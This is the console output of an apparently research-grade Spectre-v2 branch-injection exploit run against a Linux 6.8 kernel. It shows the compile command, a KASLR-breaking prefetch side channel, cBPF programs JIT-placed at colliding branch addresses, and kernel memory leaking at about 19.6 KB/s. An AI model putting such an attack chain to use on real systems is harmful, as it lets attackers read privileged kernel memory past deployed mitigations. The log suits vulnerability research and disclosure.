gcc -lm -o main main.c flush_and_reload.c cbpf.c branch_eviction.c collide_branch.c ../l2_eviction/evict_l2.c ../kaslr_prefetch/kaslr_prefetch.c -g -O3 -Wno-unused-function -lrt -lm -no-pie -lpthread -DINTEL_10_GEN -Dundef
Model name: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz
Linux version: 6.8.0-38-generic
Linux spectre_v2 mitigation info:
- Enhanced / Automatic IBRS; IBPB: conditional; RSB filling; PBRSB-eIBRS: SW sequence; BHI: SW loop, KVM: SW loop
Testing the leakage rate
================== ENVIRONMENT INFO ===================
======== Initialize KASLR Prefetch Side-Channel =======
           | min |  q1 | med |  q3 | max
  overhead |  22 |  24 |  24 |  26 |  86
    mapped |  22 |  24 |  26 |  26 |  28
  unmapped |  32 |  34 |  34 |  36 |  60
Threshold: 29, accuracy:
            hit| mis
    mapped  100|   0
  unmapped    0| 100
======================== Setup ========================
    Direct Map Start: 0xffff98e840000000
   Kernel Text Start: 0xffffffffa5e00000
       Victim Branch: 0xffffffffa64df09b
  Speculation Target: 0xffffffffa64df125
         Leak gadget: 0xffffffffa60acd97
MMAP hook (to evict): 0xffffffffa7b49540
hook entry(to evict): 0xffffffffa7b490f0
         Base Offset: 0xfffffffffffffff8
Total number of BPF instructions for page_size filter: 444
------------------------------------------------------
[-] Old last mapped module region: 0xffffffffc6f3c000
[+] Filling up gaps...
[+] Reserved in total 512 pages
[-] New last mapped module region: 0xffffffffc713d000
--> We insert 4k programs until a new 2MB chunk is allocated
[-] New last mapped module region: 0xffffffffc733e000
[+] Reserved in total 102 pages (Size 408K) before new 2MB chunk was allocated
--> Next program will be allocated at 0xffffffffc713f000
------------------------------------------------------
Selected colliding training addresses:
      VICTIM PC: 0xffffffffa64df09b TAG: 0x0ae SET: 0x184 OFFSET: 0x1b
      TRAIN  PC: 0xffffffffc72cb0a4 TAG: 0x0ae SET: 0x185 OFFSET: 0x24
   TRAIN TARGET: 0xffffffffc72cb125
------------------------------------------------------
[-] Offset between last mapped module and target: 1622180B (396 Pages or 0 * 2 MB)
Reserving 0 huge_pages...
[+] Reserved in total 0 pages
[-] Current last mapped module region: 0xffffffffc733e000
--> Next program will be allocated at 0xffffffffc713f000
[-] Offset between last mapped module and target: 1622180B (396 Pages or 0 * 2 MB)
--> We reserve the last pages upto or target, but we should stay in the same 2MB page...
[+] Reserved in total 396 pages
[-] Current last mapped module region: 0xffffffffc733e000
--> Next cBPF program will be placed at 0xffffffffc72cb000 (Colliding address)
--> Offset to train address: 0xa4. Hole between train branch and train target: 0x81
   branch_evict: 1000264df09b (tag: 0x0ae, set: 0x184)
===== Huge-page finding + Colliding cBPF Program ======
--> We scan the physical map for the huge-page kernel address
--> At the same time, we reinsert the cBPF with the training branch
--> until the branch is placed at the correct colliding address

Testing Kernel Huge Page: 0xffff98ea25a00000 (phys_map start +  7GB)
------------------------------------------------------
Hits: 996/1000 ( 99.6%)
--> The branch is JITTED on a colliding address!
--> Let's start leaking
Hits:   99990/100000 (100.0%)
Hits:   99998/100000 (100.0%)
Hits:   99997/100000 (100.0%)
Hits:   99994/100000 (100.0%)
Hits:   99999/100000 (100.0%)
================ Testing leakage rate ================
[..................................................
32 kB took  1.7 seconds (19649.5 Byte/sec)
Fault rate: 0.000%
./run.sh: line 9: 1396726 Quit                    (core dumped) taskset -c 1 ./main $1 $2

real    0m29.243s
user    0m10.305s
sys     0m6.241s
